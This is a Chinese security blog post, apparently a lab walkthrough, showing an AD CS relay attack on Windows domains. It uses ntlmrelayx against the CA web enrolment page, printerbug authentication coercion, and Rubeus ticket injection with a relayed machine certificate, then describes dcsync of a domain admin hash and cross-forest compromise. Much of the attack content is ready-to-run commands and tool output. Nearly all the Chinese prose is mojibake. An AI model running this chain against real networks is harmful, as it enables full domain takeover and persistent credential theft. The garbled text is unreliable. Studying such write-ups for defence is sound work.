> åŸæ–‡é“¾æ¥: https://www.anquanke.com//post/id/250189 


# å…¨è¡¥ä¸åŸŸæ£®æ—5ç§’æ²¦é™·ï¼ŸåŠ å¯†å‡çº§ä¹‹ä¿¡ä»»é›ªå´©


                                é˜…è¯»é‡ Â Â 
                                **23897**
                            
                        |
                        
                                                                                    



[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017ee53a3fc6bb37d1.jpg)



> åŸŸæ§ï¼ŸExchange? Sharepoint? ä¸ªäººPC? ä¸ªäººåŸŸè´¦å·/é‚®ç®±ï¼ŸåŸŸæ£®æ—ï¼Ÿç»Ÿç»Ÿåªè¦5ç§’æ‰“ä¸‹ã€‚
[![](https://p4.ssl.qhimg.com/t01cc70741e48794cfe.jpg)](https://p4.ssl.qhimg.com/t01cc70741e48794cfe.jpg)
Â 

## 0x00 è¸©ç‚¹å’Œè¯†åˆ«

åŸŸå†…å®šä½CAæœºå™¨çš„æ–¹æ³•è¾ƒå¤š, å¸¸è§å¦‚ä¸‹

```
certutil -config - -ping
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0106c7b45a565e9cf1.jpg)

æµ‹è¯•ç½‘ç»œè”é€šæ€§

```
curl 192.168.44.150/certsrv/ -I
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0145dd8a07d74f492e.jpg)

ç®€å•æ¢æµ‹`AD CS`é”™è¯¯é…ç½®<br>[![](https://p5.ssl.qhimg.com/t01e291dd538d77cb00.jpg)](https://p5.ssl.qhimg.com/t01e291dd538d77cb00.jpg)



## 0x01 æ”»å‡»Exchangeæµæ°´è´¦

æœ¬åœ°ç›‘å¬å’ŒæŒ‡å®šæ”»å‡»ç›®æ ‡ `dc2 192.168.44.150`

```
python ntlmrelayx.py  -t http://192.168.44.150/certsrv/certfnsh.asp -smb2support --adcs
```

[![](https://p1.ssl.qhimg.com/t01e4e887d3f5bcc536.jpg)](https://p1.ssl.qhimg.com/t01e4e887d3f5bcc536.jpg)

æ‰“å°æœºåè®®è§¦å‘å›è¿`Bypassç›‘æ§è§„åˆ™`

```
python printerbug.py corp/lower_user:yourpass@192.168.44.163 192.168.44.131
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0126f5e002236e4a80.jpg)

ä¸­ç»§è·å–è¯ä¹¦

[![](https://p4.ssl.qhimg.com/t01594c0353041865c4.jpg)](https://p4.ssl.qhimg.com/t01594c0353041865c4.jpg)

```
[*] Base64 certificate of user EX03$:
LONGLONGLONGSTR**********==
```

Rubeusä¸€é”®æ¢­å“ˆ

```
Rubeus.exe asktgt /user:EX03$ /certificate:LONGLONGLONGSTR**********== /ptt
```

Rubeusç”Ÿæˆç¥¨æ®å¹¶æ³¨å…¥

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01bafa2197010fe8bf.jpg)

```
C:\adcs&gt;Rubeu_S.exe asktgt /user:EX03$ /certificate:bas64_cert_str /ptt
//è¿”å›
  v1.6.4

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=ex03.BSEC.corp
[*] Building AS-REQ (w/ PKINIT preauth) for: 'BSEC.corp\EX03$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF**LongLongStrOfBase64Ticket.Kirbi***==

[+] Ticket successfully imported!

  ServiceName           :  krbtgt/BSEC.corp
  ServiceRealm          :  BSEC.CORP
  UserName              :  EX03$
  UserRealm             :  BSEC.CORP
  StartTime             :  2021/7/6 13:52:35
  EndTime               :  2021/7/6 23:52:35
  RenewTill             :  2021/7/13 13:52:35
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  XpO52RXSeAo6OdEfC+7kQQ==
```

æ³¨å…¥ç¥¨æ®å‰ä¸º`ä½æƒé™`è´¦å·

[![](https://p0.ssl.qhimg.com/t01d5dbec1f1e5250de.jpg)](https://p0.ssl.qhimg.com/t01d5dbec1f1e5250de.jpg)

æ³¨å…¥ç¥¨æ®å

[![](https://p4.ssl.qhimg.com/t0194730d7deb8ce854.jpg)](https://p4.ssl.qhimg.com/t0194730d7deb8ce854.jpg)

ç”Ÿæˆçš„ç¥¨æ®æ‹¿åˆ°`rubues/mimikatz`éƒ½æ˜¯å¯ä»¥çš„ï¼Œè½¬æ¢æˆ`ccache`ï¼Œä¹Ÿå¯ä»¥ç”¨åˆ°`impacketå·¥å…·åŒ…`é‡Œ

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d3e6e785044b6b83.jpg)

ç”Ÿæˆçš„è¯ä¹¦ä¼šåœ¨è¾ƒé•¿çš„æ—¶é—´å†…æœ‰æ•ˆ`é»˜è®¤ä¸€å¹´æœ‰æ•ˆæœŸ`



## 0x03 æ”»å‡»åŸŸæ§

å‰éƒ¨åˆ†æ“ä½œå¦‚ä¸Šæ–‡

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d12a327cc34054f7.jpg)

å¯ä»¥æ³¨å…¥åŸŸæ§`DC3$`çš„èº«ä»½

[![](https://p3.ssl.qhimg.com/t0141559d38e68ed421.jpg)](https://p3.ssl.qhimg.com/t0141559d38e68ed421.jpg)

æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨`DC3$`çš„èº«ä»½, è¿›è¡Œ `dcsync`å¯¼å‡º`åŸŸç®¡dcadmin`çš„hash

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016f0b23318bd84e20.jpg)



## 0x04 æ”»å‡»åŸŸå†…å‘˜å·¥

è¡¥ä¸æ›´æ–°åˆ°æœ€æ–°. ç³»ç»Ÿä¸º`win10 ltsc`

[![](https://p2.ssl.qhimg.com/t01a30077ecdb264749.jpg)](https://p2.ssl.qhimg.com/t01a30077ecdb264749.jpg)

å‘é€å‡ å°æ¶æ„é‚®ä»¶, ä½¿ç”¨æœ€æ–°ç‰ˆçš„`outlook`å’Œ`foxmail`æ‰“å¼€

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0187dfd805b185c1c0.jpg)

å‡æˆåŠŸè·å–åŸŸè´¦å·`win10`çš„ä¸ªäººè¯ä¹¦

[![](https://p1.ssl.qhimg.com/t01933ef204b3d92445.jpg)](https://p1.ssl.qhimg.com/t01933ef204b3d92445.jpg)

ä½¿ç”¨è¯¥è¯ä¹¦ç™»é™†`win10 ltsc`è¿™å°æœºå™¨, æˆ–è€…æŸ¥çœ‹é‚®ä»¶ç­‰ï¼Œéƒ½æ˜¯å¯ä»¥çš„. æ— è®º`åŸŸç”¨æˆ· win10`ä¿®æ”¹å¤šå°‘æ¬¡å¯†ç ï¼Œå¯†ç å¼ºåº¦å¦‚ä½•, è¯ä¹¦é»˜è®¤ä¼šä¸€å¹´æœ‰æ•ˆï¼Œå¹¶å¯ä»¥è¿›è¡Œ`ç»­ç­¾`

[![](https://p0.ssl.qhimg.com/t0135245baf2f827134.jpg)](https://p0.ssl.qhimg.com/t0135245baf2f827134.jpg)



## 0x05 åŸŸæ£®æ—æ”»å‡»

åŒæ ·è¿›è¡Œ`NTLM relay`

[![](https://p5.ssl.qhimg.com/t01815a76b01e54623a.jpg)](https://p5.ssl.qhimg.com/t01815a76b01e54623a.jpg)

ä½¿ç”¨`relay`ç­¾å‘çš„è¯ä¹¦ï¼Œå¯è§èº«ä»½å·²ç»ä»`bsec.ccop\low_user`åˆ°äº†`forest-a.bsec.ccop\DC01$`çš„åŸŸç®¡æœºå™¨è´¦å·

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d43918396327586c.jpg)

## 0x06 æ¢ä¸ªè§†é‡çœ‹è¯ä¹¦

`certsrv`ç›¸å…³ä¿¡æ¯

[![](https://p0.ssl.qhimg.com/t01a210c20bfb3ff295.jpg)](https://p0.ssl.qhimg.com/t01a210c20bfb3ff295.jpg)

ç­¾å‘è¯·æ±‚ç›¸å…³æµé‡`csr`

```
POST /certsrv/certfnsh.asp HTTP/1.1
Host: 192.168.44.150
Accept-Encoding: identity
Content-Length: 1699
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Mode=newreq&amp;CertRequest=-----BEGIN+CERTIFICATE+REQUEST-----*****-----END+CERTIFICATE+REQUEST-----&amp;CertAttrib=Info_Template&amp;TargetStoreFlags=0&amp;SaveCert=yes&amp;ThumbPrint=
```

[![](https://p1.ssl.qhimg.com/t015eddc2655f4234e6.jpg)](https://p1.ssl.qhimg.com/t015eddc2655f4234e6.jpg)

å¾®è½¯`AD CS`ç­¾å‘è¯ä¹¦æµé‡

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c8499257ddfca5b6.jpg)

opensslæŸ¥çœ‹`relay`ç›—ç­¾çš„è¯ä¹¦ä¿¡æ¯

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01031026ea39f4c1dc.jpg)

[![](https://p3.ssl.qhimg.com/t01ddfa2c681dccbaa9.jpg)](https://p3.ssl.qhimg.com/t01ddfa2c681dccbaa9.jpg)

`åŸŸCA`çš„è¯ä¹¦ç®¡ç†ä¿¡æ¯, å¯ä»¥å‘ç°`relay`ç­¾å‘çš„è¯ä¹¦ï¼Œä¹Ÿå¯ä»¥`åŠé”€`.(æ— æ³•åŠé”€é»„é‡‘è¯ä¹¦)

[![](https://p1.ssl.qhimg.com/t0158f49abe5d6578c8.jpg)](https://p1.ssl.qhimg.com/t0158f49abe5d6578c8.jpg)

`Certmgr.msc`æŸ¥çœ‹`åŠ åŸŸæœºå™¨`è‡ªåŠ¨æ¤å…¥çš„`Root CA`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01dbd231bdaba9965e.jpg)
<li>ä¸€å¼ `è¯ä¹¦èº«ä»½`å¯ä»¥å¹²ä»€ä¹ˆ
<ul>
<li>è·å–çš„ä¸ä»…æ˜¯`Tickets`
</li>
<li>æ¶‰åŠçš„ä¸ä»…æ˜¯`åŸŸå†…`
</li>
<li>æ¯ä¸ªåŠ åŸŸçš„ç”µè„‘éƒ½è‡ªåŠ¨å®‰è£…äº†`AD CS`ä¸‹å‘çš„æ ¹è¯ä¹¦`æƒ³æƒ³æ”»å‡»é¢ğŸ˜„`
</li>
<li>å¦‚æœæ”»å‡»æˆ–ç›—å–äº†`Root CA`æˆ–`Sub CA`? `æ”»å‡»é¢åˆæœ‰å¤šå¤§ğŸ˜„`
</li>


## 0x07 æ”»å‡»é“¾è·¯åˆ†æå’Œå‘æ•£
- åˆ©ç”¨AD CS(éœ€è¦å¼€å¯`è¯ä¹¦é¢å‘æœºæ„Webæ³¨å†Œ` Webæ¥å£), å°†ç›®æ ‡æœºå™¨è´¦å·çš„æƒé™, relayåˆ°`AD CS 80 web`å®ç°`pkièº«ä»½`çš„æŒä¹…åŒ–(SMB Relayåˆ° HTTP).
- å…¨ç¨‹åˆ©ç”¨äº†åŸŸå†…æ­£å¸¸æœåŠ¡`æ‰“å°æœºåè®®/Pki Webæ³¨å†Œ`, å®ç°äº†ä½å±å®³æ“ä½œç»„åˆæ‹³5ç§’æ‰“åŸŸæ§/Exchange/PC/åŸŸæ£®æ—;
<li>æ”»å‡»å…¥å£ä¸ä»…æ˜¯`æ‰“å°æœºåè®®`, åªè¦å¯æ§`æœºå™¨è´¦å·/åŸŸè´¦å·`å¤–å‘è®¤è¯ï¼Œå³å¯å®ç°ç»„åˆæ‹³ï¼Œæ”»å‡»é¢å¾ˆå¹¿ï¼Œæ”»å‡»é“¾è·¯æ¯”è¾ƒå¤š.`æœ¬æ–‡ä¸è¿‡å¤šèµ˜è¿°`
</li>
- å¦å¤–ç”¨äº†PKI/HSMå°±ä¸€å®šå®‰å…¨äº†ä¹ˆï¼Ÿä¸ç®¡æ˜¯å¼€æºæˆ–å¤–é‡‡ï¼ŒæŠ‘æˆ–å¾®è½¯çš„PKIï¼Œæ”»é˜²ä¸€ç›´åœ¨æŒç»­.
<li>ä¸ºäº†ä¸å½±å“æ–‡ç« çš„ä¸»å¹²å’Œè„‰ç»œæ¸…æ™°ï¼Œå¾ˆå¤šç‚¹æ²¡æœ‰å±•å¼€ï¼Œå¦‚æœæœ‰æœºä¼šå†æ¥`å¨å¨`
</li>


## 0x08 æ¼æ´å¼•å…¥æ€è€ƒ

> <p>ç”±äº2019å¹´çš„ä¸€ç³»åˆ—`smb/http/*-&gt;ldap`ç­‰ç»„åˆæ‹³ï¼Œå¾®è½¯å’Œä¼ä¸šITè¿ç»´åœ¨å…¨çƒèŒƒå›´å†…ï¼Œè¿…é€Ÿæ¨è¿›äº†`ldaps`çš„è¿›ç¨‹ï¼Œé‡Œé¢å¼€å¯`pki`ç³»åˆ—æœåŠ¡æ—¶ï¼Œå¦‚ä¸å°å¿ƒå‹¾é€‰äº†`è¯ä¹¦é¢å‘æœºæ„Webæ³¨å†Œ`, å³ä¼šå¸¦æ¥æ­¤æ¬¡çš„æ”»å‡»é¢. (é»˜è®¤åªéœ€è¦å‹¾é€‰`è¯ä¹¦é¢å‘æœºæ„`)<br>
ç™¾åº¦/è°·æ­Œéƒ¨åˆ†ldapså¼€å¯éƒ¨ç½²æ•™ç¨‹ä¸­ï¼Œä¸å°‘æˆªå›¾æ ‡è¯†äº†è¦å‹¾é€‰`è¯ä¹¦é¢å‘æœºæ„Webæ³¨å†Œ`ğŸ˜„</p>

[![](https://p2.ssl.qhimg.com/t01c9fa53adc6689808.jpg)](https://p2.ssl.qhimg.com/t01c9fa53adc6689808.jpg)

åæ€: åœ¨æ¶ˆå¼­ä¸€äº›æ¼æ´çš„å†ç¨‹ä¸­ï¼Œæ–°çš„åŠ¨ä½œå’Œå˜æ›´ï¼Œåˆä¼šå¼•å…¥æ–°çš„æ”»å‡»é¢å’Œé“¾è·¯ï¼Œè¿™ä¹Ÿæ­£æ˜¯æ”»é˜²çš„é­…åŠ›æ‰€åœ¨ã€‚



## 0x09 ç”³æ˜

æœ¬äººè·å–çš„ä¿¡æ¯/è¿›è¡Œçš„æ€è€ƒ/å®Œæˆçš„å®è·µï¼Œè‚¯å®šæœ‰æ¬ ç¼ºæˆ–é”™æ¼ï¼Œå¦‚æœ‰`æ„è§å’Œå»ºè®®`ç§èŠå¾®ä¿¡`red4blue`.

éé¦–å‘å®‰å…¨å®¢, å…¨æ–‡å®Œæˆä¸7æœˆ10æ—¥



## 0x10 å‚è€ƒå’Œè‡´è°¢
<li>
[Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)`2021å¹´6æœˆ17å‘å¸ƒ`
</li>
<li>
[AD CS relay attack â€“ practical guide](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)`2021å¹´6æœˆ23å‘å¸ƒ`
</li>
<li>Credits [@harmj0y](https://github.com/harmj0y) [@specterops](https://github.com/specterops) [@exandroiddev](https://github.com/exandroiddev)
</li>
<li>
`specterops`çš„ç™½çš®ä¹¦éƒ½å‘äº†å¿«äºŒä¸ªæœˆäº†, å»èŠ±1ä¸ªå°æ—¶è¿‡ä¸€éå§ï¼Œä¸äº.</li>